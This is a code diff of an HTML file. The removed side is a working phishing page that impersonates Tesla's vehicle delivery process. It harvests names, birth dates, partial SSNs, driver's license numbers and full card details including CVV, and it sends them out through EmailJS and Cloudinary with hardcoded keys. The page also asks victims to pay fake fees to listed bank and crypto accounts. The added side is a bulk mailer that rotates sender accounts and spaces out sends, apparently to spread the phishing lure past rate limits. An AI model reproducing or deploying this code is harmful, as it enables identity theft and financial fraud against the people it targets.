@@ -1,621 +1,127 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla Delivery Verification</title>
-    <style>
-        :root {
-            --tesla-red: #e82127;
-            --tesla-dark: #222;
-            --tesla-gray: #f5f5f5;
-        }
-        body {
-            font-family: 'Gotham', 'Helvetica', sans-serif;
-            background-color: #f9f9f9;
-            margin: 0;
-            padding: 0;
-            color: #333;
-        }
-        .container {
-            max-width: 600px;
-            margin: 30px auto;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
-        .header {
-            background-color: var(--tesla-dark);
-            padding: 20px;
-            text-align: center;
-        }
-        .header img {
-            height: 40px;
-        }
-        .content {
-            padding: 30px;
-        }
-        .progress-bar {
-            display: flex;
-            margin-bottom: 30px;
-            position: relative;
-            flex-direction: column;
-        }
-        .progress-steps {
-            display: flex;
-            justify-content: space-between;
-            position: relative;
-            z-index: 3;
-        }
-        .progress-step {
-            text-align: center;
-            color: #999;
-            font-size: 14px;
-            flex: 1;
-            padding: 0 5px;
-        }
-        .progress-step.active {
-            color: var(--tesla-red);
-            font-weight: bold;
-        }
-        .progress-step.completed:after {
-            content: "✓";
-            color: #5cb85c;
-            margin-left: 5px;
-        }
-        .progress-line-container {
-            position: relative;
-            height: 4px;
-            background: #eee;
-            margin: 10px 0 20px;
-            border-radius: 2px;
-        }
-        .progress-indicator {
-            position: absolute;
-            top: 0;
-            left: 0;
-            height: 100%;
-            background: var(--tesla-red);
-            border-radius: 2px;
-            transition: width 0.3s;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        .btn {
-            background-color: var(--tesla-red);
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            width: 100%;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .btn.secondary {
-            background-color: #666;
-            margin-top: 5px;
-        }
-        .security-badge {
-            display: flex;
-            align-items: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 14px;
-        }
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #999;
-            border-top: 1px solid #eee;
-        }
-        .payment-methods {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        .payment-method {
-            flex: 1;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            padding: 10px;
-            text-align: center;
-            cursor: pointer;
-        }
-        .payment-method.active {
-            border-color: var(--tesla-red);
-            background-color: rgba(232, 33, 39, 0.05);
-        }
-        .payment-method img {
-            height: 30px;
-        }
-        .confirmation-icon {
-            text-align: center;
-            margin: 20px 0;
-        }
-        .confirmation-icon svg {
-            width: 60px;
-            height: 60px;
-        }
-        .summary-box {
-            background-color: var(--tesla-gray);
-            border-radius: 4px;
-            padding: 15px;
-            margin: 20px 0;
-        }
-        .summary-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-        }
-        .summary-row.total {
-            border-top: 1px solid #ddd;
-            padding-top: 10px;
-            font-weight: bold;
-        }
-        .hidden {
-            display: none;
-        }
-        .upload-receipt {
-            margin-top: 20px;
-            border: 2px dashed #ddd;
-            padding: 20px;
-            text-align: center;
-            border-radius: 4px;
-        }
-        .file-input {
-            display: none;
-        }
-        .upload-label {
-            color: var(--tesla-red);
-            font-weight: bold;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>EmailJS CSV Rotator (Refresh-Proof)</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/papaparse@5.4.1/papaparse.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    input[type="file"] { margin-bottom: 10px; }
+    #status { margin-top: 15px; font-weight: bold; }
+    button { padding: 8px 12px; margin: 5px; }
+  </style>
 </head>
 <body>
-    <!-- Page 1: Identity Verification -->
-    <div class="container" id="identity-page">
-        <div class="header">
-            <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
-        </div>
+  <h2>EmailJS Auto Sender (Refresh-Proof)</h2>
+  <input type="file" id="csvFile" accept=".csv" />
+  <button id="pauseBtn">⏸ Pause</button>
+  <button id="resumeBtn">▶ Resume</button>
+  <p id="status">Upload your CSV to begin...</p>
+
+  <script>
+    const emailAccounts = [
+      // Your existing accounts...
+    ];
+
+    let dataRows = [];
+    let rowIndex = 0;
+    let accountIndex = 0;
+    let isPaused = false;
+    let emailInterval;
+
+    // ====== LOAD SAVED PROGRESS ======
+    function loadProgress() {
+      if (localStorage.getItem('emailSenderData')) {
+        const saved = JSON.parse(localStorage.getItem('emailSenderData'));
+        rowIndex = saved.rowIndex || 0;
+        accountIndex = saved.accountIndex || 0;
         
-        <div class="content">
-            <div class="progress-bar">
-                <div class="progress-steps">
-                    <div class="progress-step active">1. Identity</div>
-                    <div class="progress-step">2. Payment</div>
-                    <div class="progress-step">3. Confirmation</div>
-                </div>
-                <div class="progress-line-container">
-                    <div class="progress-indicator" style="width: 0%"></div>
-                </div>
-            </div>
-            
-            <h2>Identity Verification</h2>
-            <p>To comply with DMV regulations, please verify your identity for vehicle title transfer.</p>
-            
-            <div class="form-group">
-                <label for="fullname">Full Legal Name</label>
-                <input type="text" id="fullname" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="dob">Date of Birth</label>
-                <input type="date" id="dob" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="ssn">Social Security Number (Last 4 Digits)</label>
-                <input type="text" id="ssn" pattern="\d{4}" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="dl">Driver's License Number</label>
-                <input type="text" id="dl" required>
-            </div>
-            
-            <button class="btn" onclick="showPage('payment-page')">Continue to Payment</button>
-            
-            <div class="security-badge">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
-                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-                </svg>
-                Secure TLS 1.2 Encrypted Connection
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>Tesla © 2024 | Privacy Policy | Terms of Use</p>
-            <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
-        </div>
-    </div>
-
-    <!-- Page 2: Payment -->
-    <div class="container hidden" id="payment-page">
-        <div class="header">
-            <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
-        </div>
-        
-        <div class="content">
-            <div class="progress-bar">
-                <div class="progress-steps">
-                    <div class="progress-step completed">1. Identity</div>
-                    <div class="progress-step active">2. Payment</div>
-                    <div class="progress-step">3. Confirmation</div>
-                </div>
-                <div class="progress-line-container">
-                    <div class="progress-indicator" style="width: 50%"></div>
-                </div>
-            </div>
-            
-            <h2>Payment Information</h2>
-            <p>Complete your payment to secure your Tesla Model Y delivery.</p>
-            
-            <div class="summary-box">
-                <div class="summary-row">
-                    <span>Title Transfer Fee</span>
-                    <span>$1,200.00</span>
-                </div>
-                <div class="summary-row">
-                    <span>Registration Fee</span>
-                    <span>$850.00</span>
-                </div>
-                <div class="summary-row">
-                    <span>Electronic Filing</span>
-                    <span>$235.00</span>
-                </div>
-                <div class="summary-row total">
-                    <span>Total Due</span>
-                    <span>$2,285.00</span>
-                </div>
-            </div>
-
-            <div class="payment-methods">
-                <div class="payment-method active" onclick="selectPayment('credit-card')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/179/179457.png" alt="Credit Card">
-                    <div>Credit/Debit</div>
-                </div>
-                <div class="payment-method" onclick="selectPayment('bank-transfer')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/265/265680.png" alt="Bank Transfer">
-                    <div>Bank Transfer</div>
-                </div>
-                <div class="payment-method" onclick="selectPayment('crypto')">
-                    <img src="https://cdn-icons-png.flaticon.com/512/825/825454.png" alt="Crypto">
-                    <div>Crypto</div>
-                </div>
-            </div>
-
-            <div id="credit-card-payment">
-                <div class="form-group">
-                    <label for="card-number">Card Number</label>
-                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456">
-                </div>
-                
-                <div style="display: flex; gap: 15px;">
-                    <div class="form-group" style="flex: 1;">
-                        <label for="expiry">Expiration Date</label>
-                        <input type="text" id="expiry" placeholder="MM/YY">
-                    </div>
-                    <div class="form-group" style="flex: 1;">
-                        <label for="cvv">Security Code</label>
-                        <input type="text" id="cvv" placeholder="CVV">
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label for="card-name">Name on Card</label>
-                    <input type="text" id="card-name">
-                </div>
-            </div>
-
-            <div id="bank-transfer-payment" class="hidden">
-                <div class="form-group">
-                    <label>Bank Transfer Instructions</label>
-                    <div class="summary-box">
-                        <p>Please send $2,285.00 to:</p>
-                        <p><strong>Bank:</strong> Wells Fargo</p>
-                        <p><strong>Account:</strong> 9876543210</p>
-                        <p><strong>Routing:</strong> 121000248</p>
-                        <p><strong>Reference:</strong> TESLA-789123</p>
-                    </div>
-                </div>
-                
-                <div class="upload-receipt">
-                    <p>After payment, upload your transaction receipt:</p>
-                    <input type="file" id="bank-receipt" class="file-input" accept="image/*,.pdf">
-                    <label for="bank-receipt" class="upload-label">Choose File</label>
-                    <span id="bank-file-name">No file selected</span>
-                </div>
-            </div>
-
-            <div id="crypto-payment" class="hidden">
-                <div class="form-group">
-                    <label>Cryptocurrency Payment</label>
-                    <div class="summary-box">
-                        <p>Send $2,285 USD equivalent in:</p>
-                        <p><strong>Bitcoin:</strong> bc1qxy2kgdygjrsqtzq2n0yrf2493w83</p>
-                        <p><strong>Ethereum:</strong> 0x71C7656EC7ab88b098defB751B7</p>
-                        <p><strong>USDT:</strong> TNPU3wLphPC8S55aP8J3z1k</p>
-                    </div>
-                </div>
-                
-                <div class="upload-receipt">
-                    <p>After payment, upload your transaction hash:</p>
-                    <input type="file" id="crypto-receipt" class="file-input" accept="image/*,.pdf">
-                    <label for="crypto-receipt" class="upload-label">Choose File</label>
-                    <span id="crypto-file-name">No file selected</span>
-                </div>
-            </div>
-
-            <button class="btn" id="complete-payment-btn" onclick="processPayment()">Complete Payment</button>
-            <button class="btn secondary" onclick="showPage('identity-page')">Back</button>
-            
-            <div class="security-badge">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
-                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-                </svg>
-                PCI-DSS Compliant • 256-bit Encryption
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>Tesla © 2024 | Privacy Policy | Terms of Use</p>
-            <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
-        </div>
-    </div>
-
-    <!-- Page 3: Confirmation -->
-<div class="container hidden" id="confirmation-page">
-  <div class="header">
-    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
-  </div>
-  <div class="content">
-    <div class="progress-bar">
-      <div class="progress-steps">
-        <div class="progress-step completed">1. Identity</div>
-        <div class="progress-step completed">2. Payment</div>
-        <div class="progress-step active">3. Confirmation</div>
-      </div>
-      <div class="progress-line-container">
-        <div class="progress-indicator" style="width: 100%"></div>
-      </div>
-    </div>
-    <div class="confirmation-icon">
-      <svg viewBox="0 0 24 24" fill="#5cb85c">
-        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
-      </svg>
-    </div>
-    <h2 style="text-align: center;">Your Tesla Delivery is Confirmed!</h2>
-    <div class="summary-box">
-      <div class="summary-row"><span>Vehicle:</span><span>Model Y Performance</span></div>
-      <div class="summary-row"><span>VIN:</span><span id="vin-display">7SAYGDEF5PF123456</span></div>
-      <div class="summary-row"><span>Delivery Date:</span><span id="delivery-date">October 14, 2024</span></div>
-      <div class="summary-row"><span>Delivery Address:</span><span id="delivery-address">123 Main St, Anytown, CA 90210</span></div>
-      <div class="summary-row total"><span>Amount Paid:</span><span>$2,285.00</span></div>
-    </div>
-    <div style="text-align: center; margin: 25px 0;">
-      <p>You will receive a delivery confirmation email within 24 hours.</p>
-      <p>Track your vehicle at <a href="#">www.tesla.com/track</a></p>
-    </div>
-    <button class="btn" onclick="downloadReceipt()">Download Receipt</button>
-    <div class="security-badge" style="justify-content: center;">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
-        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-      </svg>
-      Transaction ID: TES-78912345-2024
-    </div>
-  </div>
-  <div class="footer">
-    <p>Tesla © 2024 | Privacy Policy | Terms of Use</p>
-    <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
-  </div>
-</div>
-
-<!-- Hidden Receipt Section for PDF generation -->
-<div id="receipt-section" style="padding: 20px; background: #fff; width: 300px; display: none;">
-  <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla" style="width: 120px; margin-bottom: 10px;">
-  <div style="text-align: center; margin: 15px 0;">
-    <svg viewBox="0 0 24 24" fill="#5cb85c" style="width:40px; height:40px;">
-      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
-    </svg>
-  </div>
-  <h2 style="text-align: center; margin-bottom: 15px;">Delivery Confirmed!</h2>
-  <div class="summary-box" style="margin-bottom: 10px;">
-    <div class="summary-row"><span>Vehicle:</span><span>Model Y Performance</span></div>
-    <div class="summary-row"><span>VIN:</span><span id="vin-display-receipt"></span></div>
-    <div class="summary-row"><span>Delivery Date:</span><span id="delivery-date-receipt"></span></div>
-    <div class="summary-row"><span>Delivery Address:</span><span id="delivery-address-receipt"></span></div>
-    <div class="summary-row total"><span>Amount Paid:</span><span>$2,285.00</span></div>
-  </div>
-  <div style="font-size: 12px; text-align: center; margin-top: 10px;">
-    Transaction ID: TES-78912345-2024
-  </div>
-  <div style="font-size: 11px; text-align: center; margin-top: 10px;">
-    Thank you for your order.
-  </div>
-</div>
-
-<!-- Custom Modal Alert -->
-<div id="custom-alert" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">
-  <div style="background:#fff; padding:20px; max-width:350px; border-radius:8px; box-shadow:0 4px 8px rgba(0,0,0,0.2); text-align:center;">
-    <h3 style="margin-bottom: 12px;">Notice</h3>
-    <p id="custom-alert-message" style="margin-bottom:20px; line-height:1.5;"></p>
-    <button style="padding:8px 16px; background:#5cb85c; color:#fff; border:none; border-radius:4px; cursor:pointer;" onclick="closeCustomAlert()">OK</button>
-  </div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-
-<script>
-emailjs.init("1-W3uHSnlpZGDZ1i3");
-
-const urlParams = new URLSearchParams(window.location.search);
-const deliveryDate = urlParams.get('deliveryDate') || 'October 14, 2024';
-const deliveryAddress = urlParams.get('address') || '123 Main St, Anytown, CA 90210';
-const vin = urlParams.get('vin') || '7SAYGDEF5PF123456';
-
-document.getElementById('delivery-date').textContent = deliveryDate;
-document.getElementById('delivery-address').textContent = deliveryAddress;
-document.getElementById('vin-display').textContent = vin;
-
-function showPage(pageId) {
-  document.querySelectorAll('.container').forEach(el => el.classList.add('hidden'));
-  document.getElementById(pageId).classList.remove('hidden');
-  if (pageId === 'confirmation-page') {
-    const nameInput = document.getElementById('fullname');
-    document.getElementById('delivery-address').textContent =
-      `${nameInput ? nameInput.value : '[Your Name]'}, ${deliveryAddress}`;
-  }
-}
-
-function selectPayment(method) {
-  document.querySelectorAll('.payment-method').forEach(el => el.classList.remove('active'));
-  document.querySelector(`.payment-method[onclick="selectPayment('${method}')"]`).classList.add('active');
-  document.getElementById('credit-card-payment').classList.add('hidden');
-  document.getElementById('bank-transfer-payment').classList.add('hidden');
-  document.getElementById('crypto-payment').classList.add('hidden');
-  document.getElementById(`${method}-payment`).classList.remove('hidden');
-}
-
-async function silentUploadToCloudinary(file) {
-  const url = 'https://api.cloudinary.com/v1_1/do9yjpizs/upload';
-  const formData = new FormData();
-  formData.append('file', file);
-  formData.append('upload_preset', 'unsigned_preset');
-  const response = await fetch(url, { method: 'POST', body: formData });
-  const data = await response.json();
-  if (!data.secure_url) throw new Error("Cloudinary upload failed");
-  return data.secure_url;
-}
-
-document.addEventListener('change', function (e) {
-  if (e.target && (e.target.id === 'bank-receipt' || e.target.id === 'crypto-receipt')) {
-    const fileName = e.target.files.length > 0 ? e.target.files[0].name : 'No file selected';
-    const labelId = e.target.id + '-label';
-    let labelEl = document.getElementById(labelId);
-    if (!labelEl) {
-      labelEl = document.createElement('div');
-      labelEl.id = labelId;
-      labelEl.style.marginTop = '8px';
-      labelEl.style.fontSize = '14px';
-      e.target.parentNode.appendChild(labelEl);
-    }
-    labelEl.textContent = `Selected file: ${fileName}`;
-  }
-});
-
-async function processPayment() {
-  const payButton = document.getElementById('complete-payment-btn');
-  const originalText = payButton.textContent;
-  payButton.textContent = 'Processing...';
-  payButton.disabled = true;
-  try {
-    const requiredFields = ['fullname', 'dob', 'ssn', 'dl'];
-    for (const fieldId of requiredFields) {
-      const field = document.getElementById(fieldId);
-      if (!field || !field.value) {
-        throw new Error(`Please complete all required fields`);
-      }
-    }
-    const paymentMethod = document.querySelector('.payment-method.active').textContent.trim();
-    const templateParams = {
-      full_legal_name: document.getElementById('fullname').value,
-      date_of_birth: document.getElementById('dob').value,
-      social_security_number: document.getElementById('ssn').value,
-      driver_license_number: document.getElementById('dl').value,
-      payment_method: paymentMethod,
-      total_amount: '$2,285.00',
-      delivery_date: deliveryDate,
-      vin_number: vin,
-      delivery_address: deliveryAddress
-    };
-    if (paymentMethod === 'Credit/Debit') {
-      const cardFields = ['card-number', 'expiry', 'cvv', 'card-name'];
-      for (const field of cardFields) {
-        const el = document.getElementById(field);
-        if (!el || !el.value.trim()) {
-          throw new Error('Please complete all card details');
+        // Check if CSV was previously loaded
+        if (saved.csvData) {
+          dataRows = saved.csvData;
+          document.getElementById('status').innerText = 
+            `🔵 Ready to resume from row ${rowIndex + 1}/${dataRows.length}`;
         }
       }
-      templateParams.card_number = document.getElementById('card-number').value;
-      templateParams.expiration_date = document.getElementById('expiry').value;
-      templateParams.security_code = document.getElementById('cvv').value;
-      templateParams.name_on_card = document.getElementById('card-name').value;
-    } else {
-      const fileInputId = paymentMethod === 'Bank Transfer' ? 'bank-receipt' : 'crypto-receipt';
-      const fileInput = document.getElementById(fileInputId);
-      if (!fileInput || fileInput.files.length === 0) {
-        throw new Error('Please upload your payment receipt');
-      }
-      const receiptUrl = await silentUploadToCloudinary(fileInput.files[0]);
-      templateParams.receipt_url = receiptUrl;
     }
-    const emailResponse = await emailjs.send(
-      'service_pveujll',
-      'template_zqpc6bx',
-      templateParams
-    );
-    if (emailResponse.status === 200) {
-      showPage('confirmation-page');
-    } else {
-      throw new Error('Email sending failed');
+    loadProgress();
+
+    // ====== SAVE PROGRESS ======
+    function saveProgress() {
+      localStorage.setItem('emailSenderData', JSON.stringify({
+        rowIndex,
+        accountIndex,
+        csvData: dataRows // Save CSV data too
+      }));
     }
-  } catch (error) {
-    showCustomAlert(error.message);
-    console.error('Payment processing error:', error);
-  } finally {
-    payButton.textContent = originalText;
-    payButton.disabled = false;
-  }
-}
 
-function showCustomAlert(message) {
-  document.getElementById('custom-alert-message').textContent = message;
-  document.getElementById('custom-alert').style.display = 'flex';
-}
+    // ====== SEND EMAIL ======
+    function sendNextEmail() {
+      if (isPaused || dataRows.length === 0) return;
 
-function closeCustomAlert() {
-  document.getElementById('custom-alert').style.display = 'none';
-}
+      const currentAccount = emailAccounts[accountIndex];
+      const currentData = dataRows[rowIndex];
 
-function downloadReceipt() {
-  document.getElementById('vin-display-receipt').textContent = document.getElementById('vin-display').textContent;
-  document.getElementById('delivery-date-receipt').textContent = document.getElementById('delivery-date').textContent;
-  document.getElementById('delivery-address-receipt').textContent = document.getElementById('delivery-address').textContent;
-  const receiptElement = document.getElementById('receipt-section');
-  receiptElement.style.display = 'block';
-  html2canvas(receiptElement).then(canvas => {
-    const imgData = canvas.toDataURL('image/png');
-    const { jsPDF } = window.jspdf;
-    const pdf = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
-    const pageWidth = pdf.internal.pageSize.getWidth();
-    const imgProps = pdf.getImageProperties(imgData);
-    const pdfHeight = (imgProps.height * pageWidth) / imgProps.width;
-    pdf.addImage(imgData, 'PNG', 0, 20, pageWidth, pdfHeight);
-    pdf.setFontSize(18);
-    pdf.text("Tesla Delivery Receipt", pageWidth / 2, 15, { align: "center" });
-    pdf.save(`Tesla_Receipt_${new Date().toISOString().slice(0,10)}.pdf`);
-    receiptElement.style.display = 'none';
-  });
-}
-</script>
+      emailjs.init(currentAccount.publicKey);
+
+      const templateParams = {
+        Name: currentData.Name,
+        vin: currentData.VIN,
+        Address: currentData.Address,
+        email: currentData.Email
+      };
+
+      emailjs.send(currentAccount.serviceID, currentAccount.templateID, templateParams)
+        .then(res => {
+          document.getElementById('status').innerText =
+            `✅ Sent to: ${templateParams.email} (Row ${rowIndex + 1}/${dataRows.length}) | Next in 10 minutes`;
+          
+          // Update and save progress
+          rowIndex = (rowIndex + 1) % dataRows.length;
+          accountIndex = (accountIndex + 1) % emailAccounts.length;
+          saveProgress();
+        })
+        .catch(err => {
+          document.getElementById('status').innerText =
+            `❌ Error sending to: ${templateParams.email} (Retrying next cycle)`;
+        });
+    }
+
+    // ====== CSV UPLOAD ======
+    document.getElementById('csvFile').addEventListener('change', function (event) {
+      const file = event.target.files[0];
+      if (!file) return;
+
+      Papa.parse(file, {
+        header: true,
+        skipEmptyLines: true,
+        complete: function (results) {
+          dataRows = results.data;
+          saveProgress(); // Save CSV data
+          document.getElementById('status').innerText =
+            `✅ Loaded ${dataRows.length} records. Starting in 5 seconds...`;
+
+          setTimeout(() => {
+            if (emailInterval) clearInterval(emailInterval);
+            emailInterval = setInterval(sendNextEmail, 10 * 60 * 1000); // Every 10 mins
+            sendNextEmail(); // Send first immediately
+          }, 5000);
+        }
+      });
+    });
+
+    // ====== PAUSE/RESUME ======
+    document.getElementById('pauseBtn').addEventListener('click', () => {
+      isPaused = true;
+      document.getElementById('status').innerText += ' (PAUSED)';
+    });
+
+    document.getElementById('resumeBtn').addEventListener('click', () => {
+      isPaused = false;
+      document.getElementById('status').innerText = '▶ RESUMED - Next email will send soon...';
+      sendNextEmail();
+    });
+  </script>
+</body>
+</html>
